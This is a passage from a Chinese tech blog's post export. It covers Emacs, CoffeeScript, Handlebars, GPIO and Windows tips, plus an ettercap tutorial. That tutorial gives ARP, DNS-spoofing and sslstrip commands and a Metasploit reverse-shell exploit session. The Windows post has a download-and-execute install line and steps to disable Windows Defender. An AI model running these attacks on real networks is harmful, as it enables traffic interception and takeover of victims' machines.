uncomment-region  取消选中区域的注释\n\nM-x hs-minor-mode     打开折叠模式，然后可以使用hs-show-block,\n  hide-hide-block, hs-show-all, hs-hide-all等命令\n\nCC-Mode \n\nC-c C-a或M-x c-toggle-auto RET，打开或关闭C模式的自动状态（输入\n  分号自动换行并缩进）。\nM-x ff-find-other-file 打开和源文件对应的头文件，或者相反。\n\n针对条件编译指令的快捷键(c-mode \u0026\u0026 c++-mode):\n\nC-c C-u: c-up-conditional, 回到 ~#if~ 的开始处\nC-c C-n: c-forward-conditional, 移动光标到当前或下一个 条件编译 的结束处。\nC-c C-p: c-backward-conditional, 移动光标到当前或上一个 条件编译 的开始处。\nM-x hide-ifdef-mode, 然后你可以按 C-c @ C-d 隐藏 ifdef block，按 C-c @\n  C-s 显示隐藏的 ifdef block. 你还可以用 C-c @ d 指定要 ifdef block 是关于哪\n  个宏的，然后你可以用 C-c @ h 和 C-c @ s 来隐藏和显示关于这个宏的 ifdef\n  block. 你可以按 C-c @ u 取消已指定的宏。\n\n编译 \n\nM-x compile：编译。\nC-x `：到下一个出错的地方。\n\n使用GDB \n\nM-x gdb：启动GDB\nC-h m: 描述GDB模式\nM-n：下一行\nM-s：下一行，遇到函数则进入\nC-c C-f：执行完当前函数\nM-c：继续执行\nC-x SPC：设置断点。\n\nEtags \n\n建立tag表。M-x cd RET切换默认目录到程序目录，\n  用M-!etags \\.[ch]建立tag表。\nM-.\tfind tags\nM-\\   返回\n如果要查看一个函数的定义，将光标在函数名上，\n  M-. RET就搞定了。\n如果emacs找错了，你可以用C-u M-. 找下一个。\n\nglobal \n\n用emacs + global阅读代码方便得很。\nglobal相当于ctags + cscope。\n\n在工程目录运行 =gtags= 生成TAG文件\n在emacs中 =M-x gtags-mode=\n然后 =M-x gtags-visit-rootdir=\n就可以使用 =M-.= 定位tag，使用 =M-= 返回\n而且可以通过 =M-x gtags-find-rtag= 定位tag被访问的位置\n\nPython模式 \n\nM-TAB   符号补全\nC-c C-c 运行当前缓冲区中的python代码\nC-c C-z 切换到Python解释器\nC-c C-k 标记光标所在的代码块\nC-c C-u 找到代码块的开始\nC-c C-f 如果你安装了pythonDoc，可以程序中某个符号的帮助文档。\nC-M-a   移动到一个函数或类定义的开始，你可以按ESC C-a来得到这个按键\n  序列。\nC-M-e   移动到一个函数或类定义的结束。\nPython代码的 折叠显示 。C-u 4 C-x $ ，只显示缩进级别小于4的\n  行；C-u 8 C-x $ ，只显示缩进级别小于8的行； C-x $ ，显示所有行。\n\nGrep \n\n如果不想记住复杂的grep参数，可以使用 =M-x rgrep= (递归子目录), =M-x lgrep= (只搜索当前目录)\n\n16. 会话管理 \n\nEmacs 23已经集成了desktop包，在退出emacs时，我们可以使用 M-x desktop-save 在选定的目录下生成 .emacs.desktop ，保存一些会话信息。\n\n在保存有 .emacs.desktop 的目录下，启动emacs，然后 M-x desktop-read 恢复会话。\n\n你可以在多个目录下保存 .emacs.desktop ，然后用 M-x desktop-change-dir 加载新的会话。现在不确定在加载新的会话前会不会保存当前会话。\n\n可以用 M-x desktop-clear 清空当前会话。\n\n17. 编码 \n\nEmacs22和Emacs21一样，通过mule能支持gb2312和utf-8编码，  但不支持gbk和gb18030。\nEmacs23进行一番大改动，内置unicode，支持gb2312, gbk, gb18030。也就是说能完美的支持中文。而且可以使用xft字体了！\n  对中文用户来讲，Emacs23将是比较完美的一个版本。\n转换文件编码，比如想把gb2312编码的文件转换为utf-8编码，C-x C-m f，会让你选择编码系统，我们选utf-8-unix，回车。则转换完成，别忘了保存。注意：C-m = RET\n如果想转换编码后，将文件另存。C-x C-m c，会让你选择编码系统，\n  然后让你输入命令序列，输入C-x C-w，输入另存的文件名，回车。\nC-x C-m k，改变键盘输入的编码系统。\nC-x C-m l，设定当前的语言环境。\nC-x C-m p, 设定进程输入输出的编码系统。\nC-x C-m r，设定打开文件的编码系统，当你打开文件乱码的时候可以试试这\n  个。\nC-x C-m t，设定终端显示的编码系统。\nC-x C-m x，设定X选中文本的编码系统。\n\n18. Faces \n\nM-x set-face-foreground\nM-x set-face-background\nM-x list-faces-display, 显示当前frame的所有face. C-u M-x\n  list-faces-display, 会提示你输入一个正则表达式，只会列出匹配这个\n  表达式的face.\nM-x highlight-phrase (C-x w p): 用指定的颜色高亮给定的字符串.\n\n19. Emacs的其它用途 \n\n在Emacs中使用shell \n\nM-! 可以执行外部命令。 C-u M-! 会将shell命令的输出结果插入到当前缓冲区中。\nM-x shell  启动shell。\nC-u M-x shell 可以打开新的shell。\n在Emacs中使用shell的好处是你可以全屏编辑，一个最酷的例子是：\n  如果你想把以前执行过的长命令修改一下再执行，\n  你可以C-r向后递增查找到这个长命令，然后编辑修改，\n  然后，最神奇的地方，你在这条命令上按回车，这条修改过的命令就执行了。\n如果你想在emacs中启动多个shell可能会疑惑，\n  因为你使用两次M-x shell也只有一个shell。\n  你需要将第一个shell所在的缓冲区重命名才能启动新的shell。\n  还记得吗？重命名用M-x rename-buffer。看来这个命令还是有些用的。\n这并不是一个功能完整的shell，如果你想在emacs中用功能完整的shell，用\n  M-x term 。\n你可以将shell中的输出或者命令提示符向普通文本一样地删除。\n  也可以用C-c C-o清理刚才的输出。\nC-c C-u 相当于C-u。M-p 上一条命令; M-n 下一条命令。\n\n用Dired做文件管理器 \n\nC-x d\t\t打开 Dired ，进入某个目录\ni         在当前缓冲区打开子目录\n$         折叠光标所在目录\n^         进入上一级目录\na         在当前缓冲区进入新的目录\ne         在当前窗口打开文件\no         在另一个窗口打开文件\nj         跳到当前目录中指定的文件\n\u003c         跳到上一个子目录\n\\  跳到下一个子目录\n\n功能很多，还是看 菜单 和 帮助* 吧。\n\n打开系统文件 \n\n要在普通用户的emacs会话中打开系统文件, 需要 TRAMP 的辅助.\nTRAMP = Transparent Remote Access Multiple Protocols,\n即支持多种协议的远程访问.\n\n打开远程文件的方法为: C-x C-f /protocol:user@machine:file,\nprotocol 可以是ftp, ssh等. 要打开本地的系统文件, 比如\n/etc/php/php.ini/, 当前用户名 john, 主机名 ArchLinux, 有两种\n方法:\n\nC-x C-f /su::/etc/php/php.ini, 相当于\n  /su:root@ArchLinux:/etc/php/php.ini, 要输入 root的密码.\nC-x C-f /sudo::/etc/php/php.ini, 相当于\n  /sudo:root@ArchLinux:/etc/php/php.ini, 要输入john的密码.\n\n其它 \n\n在emacs中查看手册，M-x man。如果要查看带颜色的手册，M-x woman。\n  man依赖于Unix/Linux系统的man，而woman是完全用elisp实现的。\nM-x list-colors-display 可以查看emacs使用的顏色。\nM-x calc 打開emacs自帶的計算器。\nC-x l: 可以显示缓冲区共有多少行，光标前有多少行，光标后有多少行。\n\n20. Vim 功能的模拟 \n\ngf：ffap (find file at point)或ffap-other-window。可以做一个键绑定：\n  (global-set-key (kbd \"C-c g f\") 'ffap-other-window)","tags":null},{"location":"//blog.pytool.com/Reship/2015-04-18-coffeescript","title":"coffeescript","text":"---\n功能array comprehensions, prototype aliases and classes\n语法\n没有分号。使用缩进来代替花括号。\n\n注释\n注释格式与ruby一致，以井号开头\n\nA comment\n\n支持多行注释，多行注释会添加到生成的javascript中\n\n\tA multiline comment\n\n变量与作用域\n编译时，CoffeeScript使用一个匿名函数把所有脚本都包裹起来，将其限定在局部作用域中，并且为所有的变量赋值前自动添加var。\n\n可以通过下面的方式创建全局变量\n\nexports = this\nexports.MyVariable = \"foo-bar\" \n\n数组和对象\n花括号可以省略，分割用的逗号可以通过换行省略。中括号不能省略。\n\nobject1 = {one: 1, two: 2}\n\n Without braces\nobject2 = one: 1, two: 2\n\nUsing new lines instead of commas\nobject3 = \n  one: 1\n  two: 2\n  \nsong = [\"do\", \"re\", \"mi\", \"fa\", \"so\"]\n\nbitlist = [\n  1, 0, 1\n  0, 0, 1\n  1, 1, 0\n]\n\n函数\n函数通过一组可选的圆括号包裹的参数, 一个箭头, 一个函数体来定义. 一个空的函数像是这样:  -  \n。函数可以是一行，也可以是多行。函数的最后一个表达式回作为隐式的返回值。\n\nsquare=(x) -  x*x\n参数默认值\n一些函数函数参数会有默认值, 当传入的参数的不存在 (null 或者 undefined) 时会被使用.\n\nfill = (container, liquid = \"coffee\") -  \"Filling the {container} with #{liquid}...\"\n\n变参\n使用...表示\n\nsum = (nums...) -  result = 0\n  nums.forEach (n) -  result += n\n  result \n\nnums 不是一个arguments 对象，而是一个真数组。\n\n函数调用\n无参数调用函数时需要加括号。如果函数被至少一个参数跟着的话，coffeescript会自动调用这个函数。\n\n函数上下文\n使用胖箭头=  ，可以确保函数的上下文绑定为当前的上下文。\n\nthis.clickHandler = -  alert \"clicked\"\nelement.addEventListener \"click\", (e) =  this.clickHandler(e)\n\n这种绑定的思想与jQuery的 proxy()或者ES5's的bind()函数是类似的概念。\n\n流程控制\nif/else 表达式可以不用圆括号和花括号就写出来. 就像函数和其他块级表达式那样, 多行的条件可以通过缩进来表明. \n\nif happy and knowsIt\n  clapsHands()\n  chaChaCha()\nelse if\n  showIt()\nelse\n  bongbong()\n\ncoffeescript支持一项ruby特性，在if语句之前使用前缀表达式。\n\nmood = greatlyImproved if singing\nunless 是if的否定\n\n三元表达式\nCoffeeScript 里不存在直白的三元表达式. — 你只要在一行内使用普通的 if 语句。在单行if语句中必须使用then关键字，这样coffeescript才能知道执行体从哪里开始。\n\ndate = if friday then sue else jill\n\n存在操作符\nCoffeeScript存在操作符?只会在变量为null或者undefined的时候会返回真，与Ruby的nil?类似。\n\n操作符和别名\n\ncoffeescript|javascript\n|","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-07 Linux内核 文件系统移植","title":"Linux内核及文件系统移植","text":"---\nLinux内核及文件系统移植\n\n嵌入式系统包含硬件子系统与软件子系统，其中软件子系统大致可分为：bootloader、Linux内核、文件系统与应用开发，这四个组成部分中前三者构建成嵌入式应用功能的基础运行环境，是进行嵌入式产品项目开发前期就需要敲定的配置环境，非常重要与关键。本课程主要对第三部分嵌入式文件系统的构建与移植进行介绍，讲解如何选择、配置、移植与制作一个可用的文件系统及其镜像，以及怎样配合Linux内核的配置调整来应用生成的文件系统，进而掌握构建完整的嵌入式软件子系统应用开发环境。\n\n开发移植环境：虚拟机Ubuntu 12.04 + FriendlyARM Smart210SDK + Windows 7 Ultimate\n\nLesson 1. Linux内核启动参数介绍与设置","tags":null},{"location":"//blog.pytool.com/Other/2016-09-09 基础知识","title":"基础知识合集","text":"催眠歌曲\n矜持 - 陈一发儿\n克卜勒 - 陈一发儿\n戴佩妮 - 我们的故事（翻唱）直播录音\n\n 英语翻译\ninstruct \"scrapy crawl linkedin.com\"\\` 执行一条指令\nflexible 弹性布局 灵活\npragmatic 实用\nIntercom 社会化客户关系管理平台 [resin.io daoclould.io]\nanti-aliased 抗锯齿\nCheatsheet小抄 备忘单 Cheat（欺骗）\nartifacts 可以译为“工件”、“制品”、“产出物” --drone\nArtifacts 项目的[打包部署]设置 -- IntelliJ IDEA\n异形 Alien\npenetration 渗透\nexploit 利用 特指针对漏洞的利用\nescape html字符转译 \u0026gt;   :: go 逃逸\ninvokes curl 调用curl\n字符转译\n\\   backslash\n`   backtick\nasterisk\n_   underscore\n{}  curly braces\n[]  square brackets\n()  parentheses\nhash mark\nplus sign\nminus sign (hyphen)\n.   dot\n!   exclamation mark\n google hack\n\n破解 序列号 Crack Keygen/Serial\n常用uid\nuid=27(mysql) gid=27(mysql) groups=27(mysql)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n 默认端口\nscrapyd   6800\n\n建站：\n10大优秀开源CMS\n论坛 nodebb\nDiscourse中文论坛\nNodeclub\nDiscuz\nwecenter\n\n 在线资源\nFontCDN\n  FontCDN is a tool for searching web fonts from Google Fonts.\n\n在线工具\n\n语法着色Highlight\n语法着色库 Prism.JS\n\n在线代码编辑器 CodeMirror\n\n软件\ncss实时编辑工具 LiveStyle\n\n 文档生成\n项目文档托管服务:Read the Fuck Document: readthedocs.org\n全文检索引擎 Sphinx\nRESTful API 文档生成工具  apidoc\nnpm install apidoc -g\napi 文档工具 Stamplay/docs\n\nPPMessage 是一个开源的在线客服平台\n\n  微信团队前端开发工作流工具 WeFlow","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-12-handlebarsjs-intro","title":"Handlebars.js 基础","text":"---\n\nHandlebars.js 是Mustache 模板语言的一个扩展。Handlebar.js 和Mustache都是logicless模板语言，目的是保持视图和逻辑分开。\n\nHandlebars.js 文档\n\n使用\n\n大体上，Handlerbars.js的语法是Mustache的超集。基本语法可以查看Mustache manpage\n\n拿到模板以后，用Handlebars.compile方法将模板编译成一个函数。生成的这个函数接收一个context参数，它会被用来渲染模板。\n\nvar source = \"pHello, my name is {{name}}. I am from {{hometown}}. I have \" +\n             \"{{kids.length}} kids:/p\" +\n             \"ul{{kids}}li{{name}} is {{age}}/li{{/kids}}/ul\";\nvar template = Handlebars.compile(source);\n\nvar data = { \"name\": \"Alan\", \"hometown\": \"Somewhere, TX\",\n             \"kids\": [{\"name\": \"Jimmy\", \"age\": \"12\"}, {\"name\": \"Sally\", \"age\": \"4\"}]};\nvar result = template(data);\n\n// Would render:\n// pHello, my name is Alan. I am from Somewhere, TX. I have 2 kids:/p\n// ul\n//   liJimmy is 12/li\n//   liSally is 4/li\n// /ul\n\n注册 Helpers\n\n你可以注册helpers，Handlebars会在渲染模板过程中使用它们。例如：\n\nHandlebars.registerHelper('linkto', function() {\n  return new Handlebars.SafeString(\"a href='\" + Handlebars.Utils.escapeExpression(this.url) + \"'\" + Handlebars.Utils.escapeExpression(this.body) + \"/a\");\n});\n\nvar context = { posts: [{url: \"/hello-world\", body: \"Hello World!\"}] };\nvar source = \"ul{{posts}}li{{linkto}}/li{{/posts}}/ul\"\n\nvar template = Handlebars.compile(source);\ntemplate(context);\n\n// Would render:\n//\n// ul\n//   lia href='/hello-world'Hello World!/a/li\n// /ul\n\nHelpers 优先级高于context中定义的fields,要想获取被helper掩盖的field，可以使用path reference。在上例中，如果在context对象中有一个叫做linkto的field,可以用下面方式引用它：\n\n{{./link_to}}\n\n转义\n\n默认情况下，{{expression}}语法会转义它的内容。避免遭到服务器传来的恶意JSON数据导致的XSS攻击。\n\n要想明确不转义内容，使用{{{}}}。\n\nHandlebars.js 与 Mustache 的不同","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 ettercap","title":"ettercap","text":"Ettercap是一个多用途的开源工具，可以用来执行嗅探、主机分析等。在本教程中，我们使用中间人攻击进行ARP欺骗，ettercap有些不错的插件，可以增强中间人攻击。Ettercap中最重要的插件如下:\ndnsspoof (执行DNS欺骗攻击)\nDosattack(对受害主机进行拒绝服务攻击)\nChkpoison(检测是否成功进行了攻击)\nRepoisonarp(顾名思义，修复ARP)\n\nEttercap SEND L3 错误  ?\nSEND L3 ERROR: 1298 byte packet (0800:06) destined to xxx.xxx.xx.xxx was not forwarded (libnetwriterawipv4(): -1 bytes written (Message too long)\n这个错误的原因其实是因为没有打开系统的ip转发功能，解决办法很简单\n\necho \"1\"   /proc/sys/net/ipv4/ipforward\n\n重装了Ubuntu 12.04，内核升级后，支持了临时IPV6地址，但是，默认被设置成了：优先走临时地址，再走public地址。\n\n关键就是这个usetempaddr啦，定义如下：\nusetempaddr \tSystem dependent (seems to be 2 on Ubuntu these days…) \tWe might expect that this is a simple on/off value to enable use of temporary addresses. Yet when we cat it on this system it has the value ’2′.\n    0：不使用临时IPV6地址\n    \u003c=0 Disable Privacy Extensions (i.e. do not use changing temporary addresses at all)\n    ==1 Use the Privacy Extensions, but prefer public (i.e. non-temporary) adresses over temporary ones.\n      1 (e.g. 2 as here) Use the Privacy Extensions and prefer them.\n\n该怎么做不用我说了吧，root直接写值即可。\nsu\necho 0   /proc/sys/net/ipv6/conf/eth0/usetempaddr\n\n 备注：此内核设置即时生效，无需重启networking服务。\n################################################################################\n\n-t 只监听这种协议\n-T ettercap检查pcap文件（脱机监听）\n-q 安静（不回显）\n-M 这是一个重要的参数，他会告诉ettercap执行中间人攻击，使用这个参数很简单，如 -M method\n-F 指定要加载的过滤规则\n-P 加载插件\n\nsudo ettercap -i enp3s0 -T -q /// ///\n\nARP欺骗\n##########################################################################\n对所有主机进行ARP欺骗\nEttercap -T -q -M ARP//\nsudo ettercap -i enp3s0 -T -q -M arp:remote /// ///\n目标/受害者 IP：192.168.1.6 欺骗\nsudo ettercap -T -q -M ARP /192.168.1.6/ //\n\n嗅探字段\nvi /etc/ettercap/etter.conf\n\n##########################################################################\netterfilter 过滤规则\nls /usr/share/ettercap\netterfilter /usr/share/ettercap/etter.filter.ssh -o ssh.ef\nsudo ettercap -T -q -i enp3s0 -F exe.ef -M ARP // // -P autoadd\n/usr/share/ettercap/\n/usr/share/ettercap/etter.fields\n指定要提取的字段\n[loginauth]\nLoginauth\n\n sslstrip\nsudo vi /etc/ettercap/etter.conf\n   redircommandon = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\"\n   redircommandoff = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\"\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 992 -j REDIRECT --to-ports 59263\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 465 -j REDIRECT --to-ports 59264\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 995 -j REDIRECT --to-ports 59265\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 563 -j REDIRECT --to-ports 59266\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 636 -j REDIRECT --to-ports 59267\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 994 -j REDIRECT --to-ports 59268\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 993 -j REDIRECT --to-ports 59269\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 8080 -j REDIRECT --to-ports 59271\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 59272\n-A PREROUTING -i enp3s0 -p tcp -m tcp --dport 990 -j REDIRECT --to-ports 59274\n\nsudo ettercap -T -q -i enp3s0 -F exe.ef -M ARP // // -P sslstrip\nDNS欺骗\n##########################################################################\n选择etter。查看Dns使用简单的命令：\nroot@bt:~# locate etter.dns\n/usr/local/share/videojak/etter.dns\n/usr/share/ettercap/etter.dns\nroot@bt:~#\n现在你可以使用你喜欢的文本编辑器来编辑这个文件。你可以使用文本编辑器nano或者其他任何你想要的\nroot@bt:~# gedit /usr/share/ettercap/etter.dns\nroot@bt:~# nano /usr/share/ettercap/etter.dns\n当你完成了保存这个文件，现在做好了准备。我们需要做得就是通过ettercap启用DNS欺骗攻击:\nroot@bt:~# ettercap -T -q -P dnsspoof -M arp // //\n\n让我们来拆开命令结构，来分析DNS欺骗攻击所用到的命令：\n-P  使用插件，这里我们使用的是dnsspoof\n-T 使用基于文本界面\n-q  启动安静模式（不回显的意思）\n-M 启动ARP欺骗攻击\n// //  代表欺骗整个子网网络\n此外，我们可以综合使用这些命令。例如，你想要欺骗一个特定的受害主机，那么你可以使用受害者的IP来执行DNS欺骗攻击。\n\nroot@bt:~# ettercap -T -q -P dnsspoof -M arp // //\n在另一个例子中，你可以使用特定的接口来执行dns欺骗攻击。为此，可以使用如下命令：\n\nroot@bt:~# ettercap -T -q -i eth0 -P dnsspoof -M arp // //\nDNS欺骗是一种非常危险的攻击，因为攻击者可以利用ettercap的dnsspoof插件和其他工具执行攻击。最终，攻击者可以使用一个社会工程工具包（作者这里指的应该是SET了）来执行攻击去控制受害者的电脑。想象一下这是多少容易，通过社会工程工具包和DNS欺骗技术你所需要做得就是配置你的社会工程工具包和你的IP清单，制作像谷歌一样的网站欺骗域名到你的IP地址上。当受害者打开google，你的攻击将使它访问你的IP，之后建立一个远程的会话。\n让我们来考虑一个示例场景：下面是是metasploit 渗透工具使用ettercap进行dns欺骗。选择你想要的exploit，在payload中我们就选择 reversetcp：\nroot@bt:~# msfconsole\no 8 o o\n8 8 8\nooYoYo. .oPYo. o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8 o8P\n8' 8 8 8oooo8 8 .oooo8 Yb.. 8 8 8 8 8 8 8\n8 8 8 8. 8 8 8 'Yb. 8 8 8 8 8 8 8\n8 8 8 Yooo' 8 YooP8 YooP' 8YooP' 8 YooP' 8 8\n..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:\n::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::\n::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n=[ metasploit v3.7.0-release [core:3.7 api:1.0]\n-- --=[ 684 exploits - 355 auxiliary\n-- --=[ 217 payloads - 27 encoders - 8 nops\n\nmsf   use windows/browser/ms10046shortcuticondllloader\nmsf exploit(ms10046shortcuticondllloader)   set SRVHOST 192.168.1.12\nSRVHOST =  192.168.1.12\nmsf exploit(ms10046shortcuticondllloader)   set PAYLOAD windows/meterpreter/reversetcp\nPAYLOAD =  windows/meterpreter/reversetcp\nmsf exploit(ms10046shortcuticondllloader)   set LHOST 192.168.1.12\nLHOST =  192.168.1.12\nmsf exploit(ms10046shortcuticon_dllloader)   exploit\n[] Exploit running as background job.\n[] Started reverse handler on 192.168.1.12:4444\n[]\n[] Send vulnerable clients to \\\\www.2cto.com \\bqokoWwx\\.\n[] Or, get clients to save and render the icon of http://your host/anything.lnk\n[]\n[] Using URL: http://192.168.1.12:80/\n[] Server started.\n如果一切正常，我们所需要做得就是根据我们的DNS配置etter文件。看下面这个图：我使用攻击者的IP地址来设置为目标网站。一旦受害者打开该网站，他将被重定向到192.168.1.12中，然后会话开始。\n\n这些只是DNS欺骗中最危险的一个方面：受害者不知道发送了什么，因为一切似乎是合情合理的，但不幸的是数据并没有进行正确的传输。此外，这种攻击非常危险，因为攻击者可能会利用这个技术在公共的wi-fi点上，入侵其他电脑。希望这篇文章已经讨论了一个有用的策略来检测ARP欺骗攻击和DNS欺骗攻击。","tags":null},{"location":"//blog.pytool.com/Other/2010-01-01 Window10 ","title":"Windows10","text":"系统工具    \n\n 命令行软件包管理 Chocolatey  \n\nChocolatey官网  \n  \n\nPS:\\  iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))  \n\nPowerShell自动补全  \n\nchoco install pscx  \n\n Windows 终端下中文乱码问题  \nwin下终端下输入 chcp 65001 将终端改成UTF8的编码    \nchcp 65001  就是换成UTF-8代码页    \nchcp 936      可以换回默认的GBK chcp 437      是美国英语    \n\n关闭Windows Defender  \nKeyboard: Win+X, A, Alt+Y Type gpedit.msc  \n  Computer Configuration   Administrative Templates   Windows Components   Windows Defender  \n  On the right hand side - double-click \"Turn off Windows Defender\"  \n  Click (o) Enabled  \n  Click [ok] button  \n\n 关闭迅雷组件 XLServicePlatform  \nsc stop XLServicePlatform    \nsc qc XLServicePlatform    \n[SC] QueryServiceConfig 成功    \n\nSERVICENAME: XLServicePlatform    \n        TYPE               : 10  WIN32OWNPROCESS    \n        STARTTYPE         : 3   DEMANDSTART    \n        ERRORCONTROL      : 1   NORMAL    \n        BINARYPATHNAME   : C:\\Windows\\system32\\svchost -k XLServicePlatform    \n        LOADORDERGROUP   :    \n        TAG                : 0    \n        DISPLAYNAME       : XLServicePlatform    \n        DEPENDENCIES       :    \n        SERVICESTARTNAME : LocalSystem    \n必备软件  \ngit  \nclang  \n\nWox  \nWox - 开源免费强大的快捷启动器辅助工具  \n  \n\nwpm install  \n\n ext2fsd  \next2fsd  \ndownload  \n\ngit for windows  \ngit for windows  \ndownload  \n\n Visual Studio  \n  \n\nAutoHotKey: 神器！神器！神器！当然也得看使用者咯(^_^) 嘻嘻……详情请参看：Win下最爱效率神器:AutoHotKey。  \n\nListary： 本地搜索神器，当然还有别的作用，More\u0026More。  \n\nLaunchy : 快速启动安装的应用程序，老而弥坚，有丝Mac下Spotlight之风；  \n\nWox ： Windows下一款最接近 Alfred 的软件启动/文件搜索利器；可参见Listary Everything Wox Launch。  \n\nChrome: Web世界里的神，的神，神。偏爱ing；如虎添翼，效率必备：Vimium~让您的Chrome起飞。  \n\nSublimeText3： 编码垒字的神器，还能览图/文件对比/…,偏爱ing；自荐笔者总结一文： 如何优雅地使用Sublime Text  \n\nPicasa3: 图片查看器中的佼佼者，偏爱ing。姑姑出品，必属精品！  \n\nClover： 在Win下必备，谁让Win资源管理器太…QT，TotalCommand太重(⊙o⊙)…  \n\nEverything： 本来必备神器，无奈我移情别恋了–Listary。不过是不会忘了你。  \n\nFoxmail： 对比体验不多，不做评判，必备；反正不用win自带的。  \n\nEvernote: 纪录/收藏你想保存的文｜图｜网页;为知笔记～功能同丰满,身材更骨感😄。  \n\nBeyond Compare : 文件比较器; 此款为所接触中最佳。  \n\nCmder: windows下cmd的替换工具,支持PowerShell;同比还有PowerShell，ConEmu 等。自荐笔者总结的：Win下必备神器之Cmder。  \n\n作业部落客户端:开启卓越写作之旅,支持全平台＋离线使用，一键发布文稿，社交化批注。身材苗条，面容姣好，免费Markdown书写平台的魅力战斗机。","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 spacemacs 启用字典","title":"spacemacs 如何自定义engine搜索","text":"---\n(defconst jerry-packages\n  '(\n    chinese-pyim-greatdict\n    ))\n\n(defun jerry/init-chinese-pyim-greatdict ()\n  (use-package chinese-pyim-greatdict)\n  )\n;;; init-chinese.el","tags":null},{"location":"//blog.pytool.com/tool/用Linux命令行生成随机密码的十种方法","title":"用Linux命令行生成随机密码的十种方法","text":"---\n\nLinux操作系统的一大优点是对于同样一件事情，你可以使用高达数百种方法来实现它。例如，你可以通过数十种方法来生成随机密码。本文将介绍生成随机密码的十种方法。\n这些方法均收集于Command-Line Fu，并且在我们自己的Linux PC机上测试过。这十种方法的一些在安装了Cygwin的Windows下也是可以运行的，特别是最后一种方法。\n\n生成一个随机密码","tags":null},{"location":"//blog.pytool.com/Reship/2015-04-30-javascript-array-loop","title":"javascript 数组循环","text":"原文地址：http://stackoverflow.com/questions/9329446/for-each-over-an-array-in-javascript\n\n数组\n\n使用forEach(ES5+)\n使用for\n使用for-in\n使用for-of (隐式的使用iterator)(ES6+)\n显式的使用iterator\n\n使用forEach 和相关的\n\n如果你的浏览器支持ECMAScript5，可以直接用forEach\nvar a=[\"a\",\"b\",\"c\",\"d\"];\na.forEach(function(entry){\n    console.log(entry);\n})\nforEach 接受一个迭代函数，和一个可选的值，在迭代函数中作为this。迭代函数可以接受三个参数：每一个输入的值，输入值的位置，和数组的引用。\n\nforEach 的好处是在循环里无需自己声明index 和value，它们以迭代函数的参数形式提供。\n\n如果你大可不必担心性能，详情：http://blog.niftysnippets.org/2012/02/foreach-and-runtime-cost.html\n\nES5还提供了好几个方便操作数组的函数：\n\nevery 当迭代函数第一次返回falsey值的时候停止循环\nsome  当迭代函数第一次返回truthy值的时候停止循环\nfilter    创建一个新的数组，包含那些在迭代函数中返回true的元素，去掉了返回false 的元素\nmap   创建了一个新的数组，由迭代函数返回值组成\nreduce    \nreduceRight\n\n使用简单的for循环\n有时候最古老的方式就是最好的：\n\nvar index;\nvar a=['a','b','c'];\n\nfor(index=0;index","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android HAL编程","title":"Android 按键输入","text":"Android HAL编程","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android Linux GPIO 输出","title":"Android gpio输出","text":"---\n使用手册\nPowerePAPRAPPROVEDv1.1.pdf\nGPIO接口解析 \nDevice Tree（二）：基本概念\n Linux加载DTS设备节点的过程(以高通8974平台为例)\nmsm平台GPIO相关的device tree设置\n我眼中的Linux设备树(四 中断)\nLinux 中断(irq)控制器以及device tree设置\n源码分析\nLinux驱动基础：device tree\nmsm平台GPIO相关的device tree设置\nGIC 驱动代码分析\nlinux kernel的中断子系统之（七）：GIC代码分析\nGPIO (Linux)\n为AM335x移植Linux内核主线代码(34)GPIO的dts及驱动\ngpiorequest 原形代码\ngpio键盘activelow参数 的作用\nactivelow = 1，还是activelow =0，要根据硬件的连接，如果按下按键为高电平那么activelow =0，如果按下按键为低电平那么activelow =1.如果这个参数搞错了，按键松开后就不断发按键键码，表现为屏幕上乱动作。\n在gpio和中断debug方法\n\n在debug目录下，可以查到每个gpio的输入输出设置，以及当前的值。\n查看所有可操作的GPIO\ncat /sys/kernel/debug/gpio\n\ncat /d/gpio\n//这个命令只会显示AP设置的GPIO信息，不显示Modem设置的GPIO信息\n\n如果想看更详细的GPIO设置的话\n\ncat /d/gpiomux\n//显示AP,CP所有的GPIO的信息\n\n//开始操作GPIO的时候必须要先执行\necho 30   /sys/class/gpio/export\n\n//设置GPIO 30的输入输出\necho \"out\"   /sys/class/gpio/gpio30/direction\necho \"in\"    /sys/class/gpio/gpio30/direction\n\n//改变GPIO 30的值\necho 1   /sys/class/gpio/gpio30/value\necho 0   /sys/class/gpio/gpio30/value\n\n//操作完毕需要执行如下命令\necho 30   /sys/class/gpio/unexport\n\n查找Wakeup IRQ等\n\necho 1   /sys/module/msmshowresumeirq/parameters/debugmask.\n//这样输入完之后，如果被中断唤醒就会输出如下log\n[ 75.0xxx] pm8xxxshowresumeirqchip: 479 triggered\n[ 75.0xxx] msmgpioshowresumeirq: 392 triggered\n[ 75.0xxx] gicshowresumeirq: 48 triggered\n[ 75.0xxx] gicshowresumeirq: 52 triggered\n显示整个中断设置情况\n\ncat /proc/interrupts","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 org-mode","title":"Emacs GTD","text":"Emacs学习笔记(11):用Org-mode实现GTD - 心内求法 - 博客园\n结合Doit.im谈谈GTD中的几个清单 | 李参的个人成长空间\n用Doit.im实施GTD的五个阶段（三）组织整理 | The Doit.im Blog\ncapture\nrefile\n\norg-modules\nOrg-mode 